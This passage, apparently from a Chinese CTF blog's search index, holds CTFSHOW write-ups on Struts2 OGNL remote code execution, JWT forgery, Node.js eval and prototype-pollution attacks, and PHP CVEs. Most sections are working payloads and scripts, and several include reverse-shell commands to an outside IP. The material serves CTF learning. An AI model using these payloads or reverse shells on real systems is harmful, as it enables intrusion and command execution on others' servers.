name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23a=@java.lang.Runtime@getRuntime().exec(%27env%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a), %23c=new+java.io.BufferedReader(%23b), %23d=new+char[51200],%23c.read(%23d), %23q=@org.apache.struts2.ServletActionContext@getResponse().getWriter(), %23q.println(%23d), %23q.close())(racr)&amp;z[(name)(%27meh%27)]\nweb284. S2-012   配置了重定向类，并利用$&#123;&#125;来进行传参的时候，就会在处理时同样触发到OGNL循环解析   POC   %&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;\nweb285. S2-013   标签&lt;s:a或&lt;s:url可将当前请求中的参数渲染到链接当中，需要设置includeParams属性值为all/get。这其中存在OGNL二次解析导致RCE\n   POC\n$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;test=%25%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#x27;id&#x27;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&#x27;dbapp%3D&#x27;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D\n\nweb286.  S2-015   设置通配符*来动态配置url路由及其返回结果页面，将会导致OGNL二次解析   &lt;package name=&quot;S2-015&quot; extends=&quot;struts-default&quot;&gt;   &lt;action name=&quot;*&quot; class=&quot;com.demo.action.PageAction&quot;&gt;      &lt;result&gt;/&#123;1&#125;.jsp&lt;/result&gt;   &lt;/action&gt;&lt;/package&gt;\n   POC   %24%7B%23context%5B&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;)%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;id&#x27;).getInputStream())%2C%23q%7D.action\nweb287. S2-016   重定向redirect功能导致和S2-012一样，会对this.location中的值进行OGNL解析   POC   redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%22env%22%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read%28%23d%29%2C%23genxor%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23genxor.println%28%23d%29%2C%23genxor.flush%28%29%2C%23genxor.close%28%29%7D\nweb288. S2-019   其实就是S2-008的Debug模式下的利用   POC   ?debug=command&amp;expression=%23p%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter()%2c%23p.println(%22hacker%22)%2c%23p.close()\nweb289. S2-029\nweb290. S2-032   DMI开启下，可以通过DefaultMemberAccess绕过静态方法限制，实现RCE   method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=env\nweb291. S2-033\n   开启Strut2 REST Plugin插件时，对actionName没有限制，导致可以绕过限制最终和S2-032一样，在DefaultActionInvocation#invokeAction中调用OGNL解析method，实现RCE\n%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=id\n\nweb292. S2-037   和S2-033同理\nweb293. S2-045   Content-type可控并流入errors中导致OGNL解析；利用JAVA对象引用特性绕过OGNL解析限制   POC   Content-Type: %&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;id&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\nweb294. S2-046   与S2-045原理一致，source点改为filename字段，利用条件是出现\\u0000或者数据大小超过2G   POC   Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;env&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\u0000b&quot;\nweb295. S2-048   与前面两个原理一致，利用了Struts1Action类中execute时会将请求中的信息带入并随后执行OGNL解析，其中请求中的信息可控   %25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23q%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27env%27%29.getInputStream%28%29%29%29.%28%23q%29%7D\nweb296. S2-052   struts2-rest-plugin插件拦截器调用xstream处理时对参数无过滤\nweb297. S2-053   类似S2-001 FreeMaker模版引擎在解析用户传递的参数时存在OGNL二次解析   POC   &#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;id&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;\n\n","tags":["ctfshow"]},{"title":"CTFSHOW-jwt","url":"/2022/10/01/ctfshow-jwt/","content":" 什么是jwt? https://xz.aliyun.com/t/2338\n\nweb345. jwt开始啦   网络头中包含jwt，且源码提示/admin\n   auth=eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2Njc0OTE0NjUsImV4cCI6MTY2NzQ5ODY2NSwibmJmIjoxNjY3NDkxNDY1LCJzdWIiOiJ1c2VyIiwianRpIjoiNDhkZmQ5NTQxNjg0MmVmNzk5YzFhZWE0ZGYzMTdhMjkifV0\n   解密查看   可以看到前面算法为None，所以可以直接改payload   user改为admin，然后访问/admin，不过官网不支持算法为None，而且似乎有时间限制，自己写一个（   不知道为啥，直接不加头才能过。。\n   # coding=gbkimport base64import requestsdef jwtBase64Encode(x):    return base64.b64encode(x.encode()).decode()url = &quot;http://34d96376-765a-4c54-8260-b8aa2b3877f0.challenge.ctf.show/&quot;r = requests.get(url)header = r.cookies.get(&#x27;auth&#x27;).split(&#x27;.&#x27;)[0]+&#x27;=&#x27;payload = r.cookies.get(&#x27;auth&#x27;).split(&#x27;.&#x27;)[1]+&#x27;=&#x27;header = base64.b64decode(header).decode()payload = &#x27;[&#123;&quot;sub&quot;: &quot;admin&quot;&#125;]&#x27;print(payload)print(header)exp = jwtBase64Encode(payload)cookie = &#123;    &#x27;auth&#x27;: exp&#125;print(requests.get(url=(url+&#x27;admin&#x27;), cookies=cookie).text)\nweb346. jwt开始啦   这道题拿到cookie后解密查看{:height 378, :width 606}   这道题的绕过思路是将alg算法字段设为None   设定该功能的最初目的是为了方便调试。但是，若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为“None”来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站。\n   # coding=gbkimport jwtimport requestspayload = &#123;  &quot;iss&quot;: &quot;admin&quot;,  &quot;iat&quot;: 1667661864,  &quot;exp&quot;: 1667669064,  &quot;nbf&quot;: 1667661864,  &quot;sub&quot;: &quot;admin&quot;,  &quot;jti&quot;: &quot;5e09a625249b8d2b02d937ea6bfc744b&quot;&#125;header = &#123;  &quot;alg&quot;: &quot;none&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;token = jwt.encode(payload, key=&quot;&quot;, algorithm=&quot;none&quot;, headers=header)url = &quot;http://b3699e0a-d78f-45fe-aea2-6b3f5b1303eb.challenge.ctf.show/admin&quot;cookie = &#123;    &#x27;auth&#x27;: token&#125;r = requests.get(url, cookies=cookie)print(r.text)\nweb347.  jwt开始啦 弱口令   还是先拿到cookie，解密   题目提示了弱口令，加密算法为HS256 对称加密+签名的方式。尝试123456   # coding=gbkimport jwtimport requestspayload = &#123;  &quot;iss&quot;: &quot;admin&quot;,  &quot;iat&quot;: 1667662665,  &quot;exp&quot;: 1667669865,  &quot;nbf&quot;: 1667662665,  &quot;sub&quot;: &quot;admin&quot;,  &quot;jti&quot;: &quot;cd37664abf02e203553e5de2d4d896a0&quot;&#125;header = &#123;  &quot;alg&quot;: &quot;HS256&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;token = jwt.encode(payload, key=&quot;123456&quot;, algorithm=&quot;HS256&quot;, headers=header)url = &quot;http://c0e181e3-71aa-4a14-9876-73ac6f4c5adc.challenge.ctf.show/admin&quot;cookie = &#123;    &#x27;auth&#x27;: token&#125;r = requests.get(url, cookies=cookie)print(r.text)\nweb348. jwt开始啦 爆破   拿到cookie，解密   依然是HS256   利用 c-jwt-cracker 进行爆破   然后同上题代码即可拿到flag\nweb349.   这次题目还给了代码，审计一波   /* GET home page. */router.get(&#x27;/&#x27;, function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var privateKey = fs.readFileSync(process.cwd()+&#x27;//public//private.key&#x27;);  var token = jwt.sign(&#123; user: &#x27;user&#x27; &#125;, privateKey, &#123; algorithm: &#x27;RS256&#x27; &#125;);  res.cookie(&#x27;auth&#x27;,token);  res.end(&#x27;where is flag?&#x27;);  &#125;);router.post(&#x27;/&#x27;,function(req,res,next)&#123;\tvar flag=&quot;flag_here&quot;;\tres.type(&#x27;html&#x27;);\tvar auth = req.cookies.auth;\tvar cert = fs.readFileSync(process.cwd()+&#x27;//public/public.key&#x27;);  // get public key\tjwt.verify(auth, cert, function(err, decoded) &#123;\t  if(decoded.user===&#x27;admin&#x27;)&#123;\t  \tres.end(flag);\t  &#125;else&#123;\t  \tres.end(&#x27;you are not admin&#x27;);\t  &#125;\t&#125;);&#125;);\n   其中我们可以看到这次的加密算法时RS256非对称加密，利用私钥进行签名加密，公钥进行解密。特别注意公私钥都放在了/public目录下，我们直接拿到   拿到cookie解密之后也可以映证   # coding=gbkimport jwtimport requestsprivate_key = open(&#x27;/Users/racerz/Desktop/Java Sec/代码审计/OWASP/private.key&#x27;, &#x27;r&#x27;).read()public_key = open(&#x27;/Users/racerz/Desktop/Java Sec/代码审计/OWASP/public.key&#x27;, &#x27;r&#x27;).read()payload = &#123;  &quot;user&quot;: &quot;admin&quot;,  &quot;iat&quot;: 1667664490&#125;header = &#123;  &quot;alg&quot;: &quot;RS256&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;token = jwt.encode(payload, key=private_key, algorithm=&quot;RS256&quot;, headers=header)cookies = &#123;    &#x27;auth&#x27;: token &#125;url = &quot;http://2ae2702b-ff90-47cb-ad6e-051d09e41025.challenge.ctf.show/&quot;r = requests.post(url, cookies=cookies)print(r.text)\nweb 350.   这次给了整套源码，验证cookie的部分没变，不过在public目录下只有公钥文件了   查看cookie，解密   利用原因：   此攻击的原因是某些库对签名/验证HMAC对称加密的密钥和包含用于验证RSA签名令牌的公钥的密钥使用相同的变量名。通过将算法调整为HMAC变体（HS256/HS384/HS512）并使用公共可用公钥对其进行签名，我们可以欺骗服务使用机密变量中的硬编码公钥验证HMAC令牌。\n   因为node和python生成jwt的机制不同，所以直接利用node来生成   var jwt = require(&#x27;jsonwebtoken&#x27;);var fs = require(&#x27;fs&#x27;);var publicKey = fs.readFileSync(&#x27;public/public.key&#x27;);var token = jwt.sign(&#123; user: &#x27;admin&#x27; &#125;, publicKey, &#123; algorithm: &#x27;HS256&#x27; &#125;);console.log(token)\n\n","tags":["ctfshow"]},{"title":"CTFSHOW-nodejs","url":"/2022/10/01/ctfshow-nodejs/","content":"\nweb334. 开始nodejs   题面一打开是一个登陆框，并且给了源码，进行一波代码审计   第一题分析的细致一些，主逻辑应该是在login.js当中，开头导入了一个user模块，其中包含一个items，其中是一个很像用户名和密码的对象&#123;username: &#39;CTFSHOW&#39;, password: &#39;123456&#39;&#125;{:height 90, :width 543}   我们再看路由\n   router.post(&#x27;/&#x27;, function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;flag_here&#x27;;  var sess = req.session;  var user = findUser(req.body.username, req.body.password);   if(user)&#123;    req.session.regenerate(function(err) &#123;      if(err)&#123;        return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;&#125;);              &#125;             req.session.loginUser = user.username;      res.json(&#123;ret_code: 0, ret_msg: &#x27;登录成功&#x27;,ret_flag:flag&#125;);                  &#125;);  &#125;else&#123;    res.json(&#123;ret_code: 1, ret_msg: &#x27;账号或密码错误&#x27;&#125;);  &#125;    &#125;);///////////////var findUser = function(name, password)&#123;  return users.find(function(item)&#123;    return name!==&#x27;CTFSHOW&#x27; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;  &#125;);&#125;;\n   findUser函数检验name是否不等于CTFSHOW且password等于123456，若成功则会返回登陆成功及flag\n实际上username是小写hhhh，那就直接登就完了\n\nweb335. 开始nodejs RCE   题目提示在源代码中   eval可以推测应该是node版代码执行。   在nodejs中，eval()方法用于计算字符串，并把它作为脚本代码来执行，语法为“eval(string)”；如果参数不是字符串，而是整数或者是Function类型，则直接返回该整数或Function   child_process.exec(): spawns a shell and runs a command within that shell, passing the  stdout  and  stderr to a callback function when complete.   child_process.execSync(): a synchronous version of  child_process.exec() that will block the Node.js event loop   ?eval=require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;)\nweb336. 开始nodejs   和刚才题面一致，试一下上一题的payload   回显tql，说明存在过滤   一个细节是__filename可回显源码所在路径名   __filename 表示当前正在执行的脚本的文件名。它将输出文件所在位置的绝对路径，且和命令行参数所指定的文件名不一定相同。 如果在模块中，返回的值是模块文件的路径。 __dirname 表示当前执行脚本所在的目录。   然后利用fs模块的readFileSync即可读取文件内容Asynchronously reads the entire contents of a file.   # __filename 回显 /app/routes/index.jsrequire(&#x27;fs&#x27;).readFileSync(&#x27;/app/routes/index.js&#x27;)\n   源码如下   var express = require(&amp;#39;express&amp;#39;);var router = express.Router();/* GET home page. */router.get(&amp;#39;/&amp;#39;, function(req, res, next) &#123;  res.type(&amp;#39;html&amp;#39;);  var evalstring = req.query.eval;  if(typeof(evalstring)==&amp;#39;string&amp;#39; &amp;amp;&amp;amp; evalstring.search(/exec|load/i)&amp;gt;0)&#123;  \tres.render(&amp;#39;index&amp;#39;,&#123; title: &amp;#39;tql&amp;#39;&#125;);  &#125;else&#123;  \tres.render(&amp;#39;index&amp;#39;, &#123; title: eval(evalstring) &#125;);  &#125;  &#125;);module.exports = router;\n   可以看到过滤了exec和load   可以通过字符串拼接的方式来绕过   ?eval=require(&#x27;child_process&#x27;)[&#x27;exe&#x27;+&#x27;cSync&#x27;](&#x27;ls&#x27;)\nweb337. 数组绕过   直接给了源码   var express = require(&#x27;express&#x27;);var router = express.Router();var crypto = require(&#x27;crypto&#x27;);function md5(s) &#123;  return crypto.createHash(&#x27;md5&#x27;)    .update(s)    .digest(&#x27;hex&#x27;);&#125;/* GET home page. */router.get(&#x27;/&#x27;, function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;xxxxxxx&#x27;;  var a = req.query.a;  var b = req.query.b;  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;  \tres.end(flag);  &#125;else&#123;  \tres.render(&#x27;index&#x27;,&#123; msg: &#x27;tql&#x27;&#125;);  &#125;  &#125;);module.exports = router;\n   这题主要判断点在a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)   思路也是跟PHP差不多的数组绕过{:height 481, :width 448}   这里其实是有点区别，不过意思就是输出一个与元素本身值无关的信息出去就行，比如上面这种形式对象的输出就是会显示其属性的类型而不是值   a[:]=1&amp;b[:]=2\nweb338.  原型链污染题目给了源码   /* GET home page.  */router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;flag_here&#x27;;  var secert = &#123;&#125;;  var sess = req.session;  let user = &#123;&#125;;  utils.copy(user,req.body);  if(secert.ctfshow===&#x27;36dboy&#x27;)&#123;    res.end(flag);  &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);    &#125;    &#125;);// utils.copy()function copy(object1, object2)&#123;    for (let key in object2) &#123;        if (key in object2 &amp;&amp; key in object1) &#123;            copy(object1[key], object2[key])        &#125; else &#123;            object1[key] = object2[key]        &#125;    &#125;  &#125;// app.jsapp.use(session(&#123;  name: identityKey,  secret: &#x27;ctfshow_session_secret&#x27;,   store: new FileStore(),   saveUninitialized: false,   resave: false,  cookie: &#123;    maxAge: 60 * 60 * 1000 // 有效期，单位是毫秒  &#125;&#125;));\n   我们可以看到，要想得到flag，需要让secret.ctfshow属性为36dboy，我们可控的是user的属性，其中唯一可以联系的就在这个copy函数当中，存在对象属性间的复制，这里就利用到了原型链污染漏洞   我们的目标就是污染secert对象的ctfshow属性   &#123;&quot;__proto__&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125;\nweb339.   可以看到源码当中的变动   if(secert.ctfshow===flag)&#123;    res.end(flag);  &#125;\n   新增了一个api.js   router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  res.render(&#x27;api&#x27;, &#123; query: Function(query)(query)&#125;);   &#125;);\n   这里的细节就是query没有被其他变量复制，且我们的copy还在运作，所以仍然可以污染到Object   nodejs 没有require下引入模块   global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/ 0&gt;&amp;1 \\&quot;&#x27;)\n   顺便补一下bash   bash -c 从字符串中读入命令bash -i，意为创建一个交互式的bash shellbash -i &gt;&amp; /dev/tcp/192.168.1.1/9090 0&gt;&amp;1/dev/tcp/192.168.1.1/9090，这是一个特殊文件，它会建立一个连接到192.168.1.1:9090的socketbash -i创建一个交互式的bash，&amp;&gt;将bash的标准输出重定向到/dev/tcp/192.168.1.1/9090的socket连接上，0&gt;&amp;1将标准输入重定向到标准输出，最终的结果就是标准输入也被重定向到了TCP连接中，因此输入和输出都可以在公网主机上进行，通过TCP连接和bash进行交互\n   POC   &#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/43.140.198.45/5000 0&gt;&amp;1\\&quot;&#x27;)&quot;&#125;&#125;\n   之后访问/api 使得Function执行\nweb340. 原型链污染   var user = new function()&#123;    this.userinfo = new function()&#123;    this.isVIP = false;    this.isAdmin = false;    this.isAuthor = false;         &#125;;  &#125;  utils.copy(user.userinfo,req.body);  if(user.userinfo.isAdmin)&#123;   res.end(flag);\n   我们之前是直接复制到user当中，而修改后变成了user.userinfo 由于isAdmin已经被写，但是之前的query依旧可被污染，需要注意的是，这道题当中对象之间多了一层关系，我们想要污染到Object，需要两层__proto__   POC   id:: 636142ba-9e3e-4edd-b6c1-a1dace261858&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/43.140.198.45/5000 0&gt;&amp;1\\&quot;&#x27;)&quot;&#125;&#125;&#125;\n\nweb341. 原型链污染   再次查看题面，可以看到不会再输出flag变量了   router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var user = new function()&#123;    this.userinfo = new function()&#123;    this.isVIP = false;    this.isAdmin = false;    this.isAuthor = false;         &#125;;  &#125;;  utils.copy(user.userinfo,req.body);  if(user.userinfo.isAdmin)&#123;    return res.json(&#123;ret_code: 0, ret_msg: &#x27;登录成功&#x27;&#125;);    &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;&#125;);    &#125;  &#125;);\n   同时index.js中也删去了对query的可利用函数   那么原型链污染的利用点在哪里呢，在app.js中我们可以看到var ejs = require(&#39;ejs&#39;);   这个模版引擎存在原型链污染RCE   因为没有下载相关ejs库源代码，这里直接截一个sink点的图{:height 353, :width 668}   这里可以看到，opts.outputFunctionName成员属性在整个过程处于undefined的状态，在if条件句下会被拼接并在后续代码中执行。这里可以通过原型链污染漏洞进行属性污染，当然需要注意的是闭合前后两个拼接语句。   outputFunctionName: a; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;); //\n   结合本题，我们的污染执行点还是在utils.copy(user.userinfo,req.body);处   也就是进行两级原型链污染   payload   \t&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1; global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/43.140.198.45/5000 0&gt;&amp;1\\&quot;&#x27;); var _tmp2&quot;&#125;&#125;&#125;\nweb342-343. 审计了1个小时发现的，此链目前网上未公开，难度稍大   app.js中可以看到换了一套模版引擎 jade{:height 147, :width 638}   https://xz.aliyun.com/t/7025   原型链污染的触发点还是在index.js的utils.copy(user.userinfo,req.body);处   POC   &#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;console.log(global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/43.140.198.45/5000 0&gt;&amp;1\\&quot;&#x27;))&quot;&#125;&#125;\nweb344.   题面给了hint   router.get(&#x27;/&#x27;, function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag = &#x27;flag_here&#x27;;  if(req.url.match(/8c|2c|\\,/ig))&#123;  \tres.end(&#x27;where is flag :)&#x27;);  &#125;  var query = JSON.parse(req.query.query);  if(query.name===&#x27;admin&#x27;&amp;&amp;query.password===&#x27;ctfshow&#x27;&amp;&amp;query.isVIP===true)&#123;  \tres.end(flag);  &#125;else&#123;  \tres.end(&#x27;where is flag. :)&#x27;);  &#125;&#125;);\n   其中url中过滤了8c/2c/, 其中2c对应的就是,   针对逗号的过滤可以用&amp;绕过   nodejs 会把同名参数以数组的形式存储，并且   JSON.parse  可以正常解析。   payload   /?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;\n   这里有个细节就是c需要url编码，因为GET传参后，其前面的字符&quot;经过编码会为%22与c连接会触发黑名单\n\n","tags":["ctfshow"]},{"title":"CTFSHOW-phpCVE","url":"/2022/10/01/ctfshow-phpCVE/","content":"\nweb311. 似曾相识,就这一个文件，不用扫描 CVE-2019-11043   这里主要记录如何寻找相关POC及利用   题面就一个空页，抓包看版本   搜到CVE-2019-11043   工具扫不动。。。 其实就是在当前目录有个txt文件\nweb312. 你懂的 CVE-2018-19518   php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。因为ssh命令中可以通过设置-oProxyCommand=来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞\n   https://vulhub.org/#/environments/php/CVE-2018-19518/   写马，连shell\nweb313. 你懂的 CVE-2012-1823   https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html   测试传递-scgi参数{:height 155, :width 509}   然后可以利用任意文件包含配合伪协议来执行shell\nweb314. 严格来说算不上cve   题面如下   &lt;?phperror_reporting(0);highlight_file(__FILE__);//phpinfo$file = $_GET[&#x27;f&#x27;];if(!preg_match(&#x27;/\\:/&#x27;,$file))&#123;    include($file);&#125;\n   直接尝试日志文件包含/var/log/nginx/access.log\nweb315.   debug开启，端口9000   XDebug 远程调试漏洞   https://www.wangan.com/docs/399   这个配置下，我们访问 http://target/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的 XDebug 将会连接访问者的 IP（或 X-Forwarded-For 头指定的地址）并通过 dbgp 协议与其通信，我们通过 dbgp 中提供的 eval 方法即可在目标服务器上执行任意 PHP 代码   有利用脚本但是不好连   跟第一题的打不通来了个呼应哈哈哈，也是在当前目录存在一个flaaaxx.php\n\n","tags":["ctfshow"]},{"title":"CTFSHOW-代码审计","url":"/2022/10/01/ctfshow-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","content":"\nweb301.  审计审计我三年前写的代码  题面打开看看是啥，常见的系统登陆框{:height 375, :width 581}  